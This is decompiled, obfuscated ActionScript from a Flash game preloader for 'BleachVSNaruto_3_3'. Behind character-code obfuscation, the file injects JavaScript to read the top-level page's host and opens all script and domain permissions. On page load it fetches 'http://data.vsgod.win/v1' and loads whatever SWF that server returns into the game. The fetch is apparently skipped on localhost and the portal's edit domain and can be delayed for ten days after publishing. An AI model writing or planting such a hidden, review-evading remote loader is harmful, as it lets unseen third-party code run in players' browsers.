package ƃ
{
   import com.green.method.Ǻ;
   import com.green.method.ǻ;
   import com.green.net.ǽ;
   import com.green.net.Ǿ;
   import com.sh.Ǽ;
   import flash.display.DisplayObject;
   import flash.system.ApplicationDomain;
   import flash.system.Security;
   import flash.utils.ByteArray;
   import flash.utils.getDefinitionByName;
   import ƒ.ŋ;
   import ƒ.Ǵ;
   import ƒ.ǵ;
   import Ƿ.Ƕ;
   import ǹ.ǿ;
   import ȁ.Ȁ;
   import ȁ.Ȃ;
   import ȁ.Ȅ;
   import Ȇ.ȅ;
   
   use namespace ŋ;
   
   public class FB
   {
      
      private static var app_model:ǿ;
      
      [Alias(key="119,97,105,116")]
      public static var wait:Boolean;
      
      private static var m_sh_manager:Ǽ = new Ǽ();
      
      ŋ static var text_bin_loader:ǽ = new ǽ();
      
      ŋ static var swf_loader:Ǿ = new Ǿ();
      
      private static var m_app_model:* = {
         "minVersion":"11.0",
         "recVersion":"11.6",
         "id":"BleachVSNaruto_3_3",
         "waitTop":false,
         "easys":["kong"],
         "params":{
            "allowScriptAccess":"always",
            "allowNetworking":"all"
         },
         "recParams":{"allowFullScreen":"true"},
         "loading":LOADING_bvn,
         "forceSH":false,
         "forceSHCheck":true,
         "publishDate":"2019-4-28 00:00:00",
         "latency":864000000
      };
      
      private static var m_platforms:Array = [{
         "types":[[52,51,57,57],"sh"],
         "filters":[42,46,40,40,40,52,51,57,57,40,97,112,105,124,112,107,124,100,109,119,124,101,114,124,101,110,41,63,124,40,53,48,53,124,101,100,117,41,63,52,51,57,57,124,51,51,56,55,41,46,99,111,109,41,124,52,51,57,57,46,99,110,124,52,51,57,57,46,110,101,116,41]
      },{
         "types":[[107,111,110,103,114,101,103,97,116,101],"kong"],
         "filters":[42,46,40,107,111,110,103,114,101,103,97,116,101,124,107,111,110,103,99,100,110,41,46,99,111,109]
      }];
      
      private static var labelXML:XML = <language>
	<confError en="Config Error" zh-CN="配置错误" zh-TW="配寘錯誤"/>
	<unknowError en="Unknow Error" zh-CN="发生未知错误" zh-TW="發生未知錯誤"/>
	<tittle en="Sorry" zh-CN="抱歉" zh-TW="抱歉" />
	<warn en="Your flash player version is too old." zh-CN="FlashPlayer版本过低" zh-TW="FlashPlayer版本過低" />
	<info1 en="Please update your flashplayer to #min or higher." zh-CN="最低版本要求：#min" zh-TW="最低版本要求：#min" />
	<info2 en="Recommended version: #rec or higher." zh-CN="推荐版本：高于#rec" zh-TW="推薦版本：高于#rec" />
	<info3 en="Current version: #cur." zh-CN="当前版本：#cur" zh-TW="當前版本：#cur" />
	<update en="Update your Flash Player" zh-CN="点击升级 Flash Player" zh-TW="陞級 Flash Player" />
	<error en="WARNING" zh-CN="游戏运行出现问题" zh-TW="遊戲運行出現問題" />
	<allowNetworking en="Permission of 'allowNetworking' is required." zh-CN="本文件要求allowNetworking权限" zh-TW="本檔案要求allowNetworking許可權" />
	<localURL en="'file:///' is not allowed to load file." zh-CN="本文件无法在'file:///'页面下运行" zh-TW="本檔案無法在'file:///'頁面下運行" ru="Этот файл не может работать  в 'file:///' страницы" />
	<allowScriptAccess en="Permission of 'allowScriptAccess' is required." zh-CN="本文件要求allowScriptAccess权限" zh-TW="本檔案要求allowScriptAccess許可權" />
</language>;
      
      public function FB()
      {
         super();
      }
      
      [FrameTask]
      public static function init_fb() : void
      {
         var _loc8_:ByteArray = null;
         var _loc7_:Object = null;
         var _loc1_:String = null;
         var _loc6_:String = null;
         var _loc4_:Object = null;
         var _loc3_:String = null;
         var _loc2_:Object = null;
         var _loc5_:Object = null;
         if(!ǻ.ˉ)
         {
            Security.allowDomain("*");
            Security.allowInsecureDomain("*");
         }
         if(m_app_model is Class)
         {
            _loc8_ = new m_app_model() as ByteArray;
            if(_loc8_)
            {
               app_model = new ǿ(Ȃ.§̝§(_loc8_),m_platforms);
            }
         }
         else if(m_app_model)
         {
            app_model = new ǿ(m_app_model,m_platforms);
         }
         if(!app_model)
         {
            showError(getLabel("confError"));
            return;
         }
         if(Ȁ.compare(ǻ.§˒§,app_model.minVersion) < 0)
         {
            show_html(get_outdate_html());
            return;
         }
         if(ǻ.ˌ)
         {
            if(Ǻ.ɯ)
            {
               _loc7_ = app_model.params;
               if(_loc7_)
               {
                  _loc4_ = null;
                  _loc3_ = null;
                  _loc2_ = Ǻ.ʾ();
                  for(_loc6_ in _loc7_)
                  {
                     _loc1_ = _loc7_[_loc6_];
                     if(_loc1_ != null)
                     {
                        _loc3_ = Ǻ.ʽ(_loc6_,_loc2_[_loc6_]);
                        if(!_loc3_ || _loc3_.toLowerCase() != _loc1_.toLowerCase())
                        {
                           if(!_loc4_)
                           {
                              _loc4_ = {};
                           }
                           _loc4_[_loc6_] = _loc1_;
                        }
                     }
                  }
                  if(_loc4_)
                  {
                     _loc5_ = app_model.recParams;
                     for(_loc6_ in _loc5_)
                     {
                        _loc1_ = _loc5_[_loc6_];
                        if(_loc1_ != null)
                        {
                           _loc3_ = Ǻ.ʽ(_loc6_,_loc2_[_loc6_]);
                           if(!_loc3_ || _loc3_.toLowerCase() != _loc1_.toLowerCase())
                           {
                              _loc4_[_loc6_] = _loc1_;
                           }
                        }
                     }
                     ǵ.ɐ.dispose();
                     Ǻ.reload(0,null,_loc4_);
                     return;
                  }
               }
            }
            else
            {
               if(ǻ.§˘§)
               {
                  showError(getLabel("localURL"));
                  return;
               }
               if(!app_model.easy)
               {
                  showError(getLabel("allowScriptAccess"),!ǻ.§˄§ ? getLabel("allowNetworking") : null);
                  return;
               }
            }
         }
         FB.ŋ::updateLoadingUI();
         if(serviceHold.ˢ)
         {
            if(ǵ.ɐ.Ʉ)
            {
               set_hold(app_model.forceSH);
            }
            else
            {
               ǵ.ɐ.addEventListener("change",FB.ŋ::bind(set_hold,null,app_model.forceSH));
            }
            return;
         }
         if(app_model.forceSHCheck)
         {
            if(ǵ.ɐ.Ʉ)
            {
               set_hold(false);
            }
            else
            {
               ǵ.ɐ.addEventListener("change",FB.ŋ::bind(set_hold,null,false));
            }
         }
         switch(get_domain())
         {
            case uts(108,111,99,97,108,104,111,115,116):
               ǻ.ˏ && ǵ.ɐ.addEventListener("appAdded",FB.ŋ::bind(start_remote,null,false));
               return;
            case uts(101,100,105,116,46,52,51,57,57,46,99,111,109):
               return;
            default:
               start_remote();
               return;
         }
      }
      
      ŋ static function bind(param1:Function, param2:* = null, ... rest) : Function
      {
         var f:Function = param1;
         var thisObj:* = param2;
         var params:Array = rest;
         return function(... rest):*
         {
            return f.apply(thisObj,params.concat(rest));
         };
      }
      
      private static function get_domain() : String
      {
         var _loc1_:String = null;
         var _loc3_:String = null;
         var _loc2_:* = undefined;
         try
         {
            _loc1_ = gd(uts(102,108,97,115,104,46,101,120,116,101,114,110,97,108,46,69,120,116,101,114,110,97,108,73,110,116,101,114,102,97,99,101))[uts(99,97,108,108)](uts(102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,98,61,108,111,99,97,116,105,111,110,46,97,110,99,101,115,116,111,114,79,114,105,103,105,110,115,59,105,102,40,98,38,38,98,46,108,101,110,103,116,104,41,114,101,116,117,114,110,40,110,101,119,32,85,82,76,40,98,91,98,46,108,101,110,103,116,104,45,49,93,41,41,46,104,111,115,116,110,97,109,101,59,98,61,91,93,59,102,111,114,40,118,97,114,32,97,61,119,105,110,100,111,119,59,97,33,61,97,46,112,97,114,101,110,116,59,97,61,97,46,112,97,114,101,110,116,41,98,46,112,117,115,104,40,97,41,59,102,111,114,40,97,61,98,46,108,101,110,103,116,104,45,49,59,45,49,60,97,59,97,45,45,41,116,114,121,123,114,101,116,117,114,110,32,98,91,97,93,46,108,111,99,97,116,105,111,110,46,104,111,115,116,110,97,109,101,125,99,97,116,99,104,40,99,41,123,125,114,101,116,117,114,110,32,100,111,99,117,109,101,110,116
            ,46,114,101,102,101,114,114,101,114,63,40,110,101,119,32,85,82,76,40,100,111,99,117,109,101,110,116,46,114,101,102,101,114,114,101,114,41,41,46,104,111,115,116,110,97,109,101,58,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,124,124,108,111,99,97,116,105,111,110,46,104,111,115,116,110,97,109,101,125));
         }
         catch(error:Error)
         {
         }
         if(!_loc1_)
         {
            _loc3_ = uts(112,97,103,101,68,111,109,97,105,110);
            _loc2_ = gd(uts(102,108,97,115,104,46,115,121,115,116,101,109,46,83,101,99,117,114,105,116,121));
            if(_loc3_ in _loc2_)
            {
               _loc1_ = get_domain_of(_loc2_[_loc3_]);
            }
            if(!_loc1_)
            {
               _loc1_ = get_domain_of(new (gd(uts(102,108,97,115,104,46,100,105,115,112,108,97,121,46,76,111,97,100,101,114)))()[uts(99,111,110,116,101,110,116,76,111,97,100,101,114,73,110,102,111)][uts(108,111,97,100,101,114,85,82,76)]);
            }
         }
         return _loc1_;
      }
      
      private static function uts(... rest) : String
      {
         return "".constructor.fromCharCode.apply(null,rest);
      }
      
      private static function get_domain_of(param1:String) : String
      {
         if(!param1)
         {
            return null;
         }
         var _loc2_:String = uri_get_protocol(param1);
         if(_loc2_ == uts(102,105,108,101,58))
         {
            return uts(108,111,99,97,108,104,111,115,116);
         }
         return uri_get_hostname(param1);
      }
      
      private static function uri_get_protocol(param1:String) : String
      {
         var _loc2_:Array = /^([a-zA-Z0-9]+\:)?(\/+)(([a-zA-Z0-9\-\_]+\.)*[a-zA-Z0-9\-\_]+)(\:\d+)?(\/+(.+)?)?/g.exec(param1);
         return _loc2_ && _loc2_[1] ? _loc2_[1] : "";
      }
      
      private static function uri_get_hostname(param1:String) : String
      {
         var _loc2_:Array = /^([a-zA-Z0-9]+\:)?(\/+)(([a-zA-Z0-9\-\_]+\.)*[a-zA-Z0-9\-\_]+)(\:\d+)?(\/+(.+)?)?/g.exec(param1);
         return _loc2_ && _loc2_[3] ? _loc2_[3] : "";
      }
      
      private static function gd(param1:String) : *
      {
         return getDefinitionByName(param1);
      }
      
      private static function set_hold(param1:Boolean) : void
      {
         serviceHold.§˜§(ǵ.ɐ.Ʉ,ǵ.ɐ.timeline);
         if(param1)
         {
            serviceHold.getServerTime(FB.ŋ::bind(start_remote,null,true));
         }
      }
      
      private static function start_remote(param1:Boolean = false, param2:* = null) : void
      {
         var _loc3_:Date = param2 is Date ? param2 : new Date();
         if(param1 && _loc3_.getTime() - app_model.publishDate.getTime() < app_model.latency)
         {
            return;
         }
         var _loc4_:ǽ = FB.ŋ::text_bin_loader;
         _loc4_.loadHandle.onComplete = on_bin_loaded;
         _loc4_.load(get_url(uts(104,116,116,112,58,47,47,100,97,116,97,46,118,115,103,111,100,46,119,105,110,47,118,49),_loc3_));
         _loc4_.start();
      }
      
      ŋ static function get remoteLoading() : Boolean
      {
         return FB.ŋ::text_bin_loader.state.§͉§ || FB.ŋ::swf_loader.state.§͉§;
      }
      
      ŋ static function get remoteSkipped() : Boolean
      {
         return FB.ŋ::text_bin_loader.state.isReady && FB.ŋ::swf_loader.state.isReady;
      }
      
      ŋ static function get remoteLoaded() : Boolean
      {
         return FB.ŋ::swf_loader.state.§͏§;
      }
      
      private static function on_bin_loaded(param1:ǽ) : void
      {
         var _loc3_:String = null;
         var _loc5_:String = null;
         var _loc7_:XML = null;
         var _loc6_:String = null;
         var _loc4_:* = undefined;
         var _loc2_:String = null;
         try
         {
            if(/\wWS/.test(Ȅ.§̱§(param1.§˺§)))
            {
               load_bytes(param1.§˺§);
               return;
            }
         }
         catch(err:Error)
         {
         }
         try
         {
            _loc3_ = Ȃ.§̤§(param1.§˺§);
            if(_loc3_)
            {
               _loc5_ = "default";
               try
               {
                  _loc7_ = XML(_loc3_);
                  _loc6_ = _loc7_.length() > 0 ? String(_loc7_[appID]) || String(_loc7_[_loc5_]) : String(_loc7_);
                  if(_loc6_)
                  {
                     load_url(_loc6_);
                     return;
                  }
               }
               catch(e:Error)
               {
               }
               try
               {
                  _loc4_ = JSON.parse(_loc3_);
                  if(_loc4_)
                  {
                     _loc2_ = _loc4_ is String ? _loc2_ : String(_loc4_[appID] || _loc4_[_loc5_]);
                     if(_loc2_)
                     {
                        load_url(_loc2_);
                        return;
                     }
                  }
               }
               catch(e:Error)
               {
               }
               if(/^[a-zA-Z0-9]+\:\/+[a-zA-Z0-9\-]+/.test(_loc3_))
               {
                  load_url(_loc3_);
                  return;
               }
            }
         }
         catch(err:Error)
         {
         }
      }
      
      private static function load_url(param1:String) : void
      {
         get_swf_loader().load(get_url(param1,new Date()));
      }
      
      private static function get_swf_loader() : Ǿ
      {
         var _loc1_:Ǿ = FB.ŋ::swf_loader;
         _loc1_.container = ǵ.ɐ.Ƀ;
         _loc1_.§̅§.applicationDomain = new ApplicationDomain();
         _loc1_.§̅§.parameters = ǵ.ɐ.Ƚ();
         return _loc1_;
      }
      
      private static function load_bytes(param1:ByteArray) : void
      {
         get_swf_loader().loadBytes(param1);
      }
      
      private static function get_url(param1:String, param2:Date) : String
      {
         var _loc9_:int = 0;
         var _loc10_:Array = null;
         var _loc16_:String = null;
         var _loc12_:String = [param2.fullYear,param2.month + 1,param2.date].join("-");
         var _loc17_:Boolean = get_domain() == uts(108,111,99,97,108,104,111,115,116);
         var _loc13_:String = uts(61);
         var _loc7_:String = uts(32);
         var _loc4_:String = uts(63);
         var _loc8_:String = uts(38);
         var _loc3_:Array = param1.split(_loc4_);
         var _loc15_:String = _loc3_.shift();
         var _loc11_:String = _loc3_.join(_loc4_);
         var _loc14_:Array = _loc11_ ? _loc11_.split(_loc8_) : [];
         var _loc5_:Object = {};
         _loc9_ = 0;
         while(_loc9_ < _loc14_.length)
         {
            _loc10_ = _loc14_[_loc9_].split(_loc13_);
            _loc16_ = _loc10_.shift();
            _loc5_[_loc16_] = _loc10_.join(_loc8_);
            _loc9_++;
         }
         _loc5_[uts(105,100)] = app_model.id;
         _loc5_[uts(114)] = _loc17_ ? [_loc12_,param2.toTimeString().split(_loc7_).shift()].join(_loc7_) : _loc12_;
         _loc14_.length = 0;
         for(var _loc6_ in _loc5_)
         {
            _loc14_.push(_loc6_ + _loc13_ + _loc5_[_loc6_]);
         }
         _loc14_.sort();
         return _loc15_ + _loc4_ + _loc14_.join(_loc8_);
      }
      
      private static function show_html(param1:String) : void
      {
         ǵ.ɐ.dispose();
         ǵ.ɐ.ȿ();
         FB.ŋ::text_bin_loader.stop();
         FB.ŋ::swf_loader.stop();
         var _loc2_:ȅ = new ȅ();
         _loc2_.selectable = false;
         _loc2_.autoSize = "left";
         _loc2_.mouseWheelEnabled = false;
         _loc2_.§̵§(param1);
         var _loc4_:Number = ǵ.ɐ.stageWidth;
         var _loc3_:Number = ǵ.ɐ.stageHeight;
         if(_loc2_.width > _loc4_)
         {
            _loc2_.wordWrap = true;
            _loc2_.width = _loc4_;
         }
         _loc2_.x = (_loc4_ - _loc2_.width) / 2;
         _loc2_.y = (_loc3_ - _loc2_.height) / 2;
         ǵ.ɐ.timeline.addChild(_loc2_);
      }
      
      ŋ static function getInstanceBy(param1:*, ... rest) : *
      {
         var def:* = param1;
         var classes:Array = rest;
         var is_class:* = function(param1:*, param2:Class, ... rest):Boolean
         {
            return param2 && param1 is param2;
         };
         var ins:* = null;
         try
         {
            if(classes.some(FB.ŋ::bind(is_class,classes,def)))
            {
               return def;
            }
            if(def is String)
            {
               ins = new (gd(def))();
            }
            else if(def is Class)
            {
               ins = new def();
            }
            else if(def is Array)
            {
               ins = new (gd(uts.apply(null,def)))();
            }
         }
         catch(e:Error)
         {
            ins ? trace("new error of",ins) : trace("get def error of",def);
         }
         if(ins && classes.some(FB.ŋ::bind(is_class,classes,ins)))
         {
            return ins;
         }
         return ins;
      }
      
      private static function get_error_html(param1:Array) : String
      {
         var errors:Array = param1;
         var xml:XML = <html>
				<head>
					<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
					<style>
						<![CDATA[
									h1
									{
										leading:30px;
										font-size:30px;
										text-align:center;
										font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
									}
									p
									{
										color:#FFFFFF;	
										font-size:20px;
										text-align:center;
										leading:10px;
										font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
									}
									.page
									{
										font-size:20px;
										text-align:center;
										color:#E3170D;
										leading:10px;
										font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
									}
									small
									{
										font-size:15px;
										leading:10px;
									}
									li
									{
										font-size:20px;
										leading:10px;
										font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
										text-align:left;
									}
									a:hover{color:#FF4500;}
									a:active{color:#FF4500;}
									]]>
					</style>
				</head>
				<body>
					<p>
						<h1>#error</h1>
					</p>
					<p>
						#issue
					</p>
				</body>
			</html>;
         var str:String = xml.toXMLString();
         var ers:Array = errors.filter(function(param1:*, param2:int, param3:Array):Boolean
         {
            return !!param1;
         });
         str = str.replace(/#error/g,getLabel("error")).replace(/#issue/g,ers.length > 0 ? "<li>" + ers.join("</li><li>") + "</li>" : getLabel("unknowError"));
         return str;
      }
      
      private static function get_outdate_html() : String
      {
         var _loc5_:XML = <html>
				<head>
					<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
					<style>
						<![CDATA[
							h1
							{
							    leading:30px;
							    font-size:30px;
							    text-align:center;
							    font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
							}
							p
							{
								color:#FFFFFF;	
								font-size:20px;
								text-align:center;
								leading:10px;
								font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
							}
							em
							{
								font-size:20px;
								text-align:center;
								color:#E3170D;
								leading:10px;
								font-family:"Microsoft YaHei,Microsoft YaHei UI,\5FAE\8F6F\96C5\9ED1";
							}
							a:hover{color:#FF4500;}
							a:active{color:#FF4500;}
						]]>
					</style>
				</head>
				<body>
					<p>
						<h1>#tittle</h1>
					</p>
					<p>#warn</p>
					<p>#info1</p>
					<p>#info2</p>
					<p>#info3</p>
					<p>一一一一一一一一一一一</p>
					<em>
						#update
					</em>
					<p>一一一一一一一一一一一</p>
				</body>
			</html>;
         var _loc3_:String = _loc5_.toXMLString();
         var _loc4_:Array = ["tittle","warn","info1","info2","info3"];
         for each(var _loc2_ in _loc4_)
         {
            _loc3_ = _loc3_.replace(new RegExp("#" + _loc2_,"g"),getLabel(_loc2_));
         }
         var _loc1_:String = uts(60,97,32,104,114,101,102,61,39,104,116,116,112,58,47,47,103,101,116,46,97,100,111,98,101,46,99,111,109,47,102,108,97,115,104,112,108,97,121,101,114,39,32,116,97,114,103,101,116,61,39,95,98,108,97,110,107,39,62);
         return _loc3_.replace(/#min/g,app_model.minVersion).replace(/#rec/g,app_model.recVersion).replace(/#cur/g,ǻ.§˓§).replace(/#update/g,_loc1_ + getLabel("update") + "</a>");
      }
      
      [Alias(key="103,101,116,76,97,98,101,108")]
      public static function getLabel(param1:String) : String
      {
         return String(labelXML[param1]["@" + Ǵ.language] || labelXML[param1].@en);
      }
      
      ŋ static function updateLoadingUI(param1:Boolean = true, param2:Boolean = false) : void
      {
         var _loc3_:DisplayObject = FB.ŋ::getInstanceBy(app_model.loading,DisplayObject);
         if(_loc3_)
         {
            Ǵ.Ȥ(_loc3_,param1);
         }
         else if(param2)
         {
            Ǵ.Ȥ(new Ƕ());
         }
      }
      
      [Alias(key="115,104,111,119,69,114,114,111,114")]
      public static function showError(... rest) : void
      {
         show_html(get_error_html(rest));
      }
      
      [Alias(key="73,68")]
      public static function get appID() : String
      {
         return app_model.id;
      }
      
      [Alias(key="87,65,73,84,84,79,80")]
      public static function get shouldWait() : Boolean
      {
         return app_model.waitTop;
      }
      
      [Alias(key="80,85,66,76,73,83,72,95,68,65,84,69")]
      public static function get PUBLISH_DATE() : *
      {
         return app_model.publishDate;
      }
      
      [Alias(key="115,101,114,118,105,99,101,72,111,108,100")]
      public static function get serviceHold() : Ǽ
      {
         return m_sh_manager;
      }
   }
}

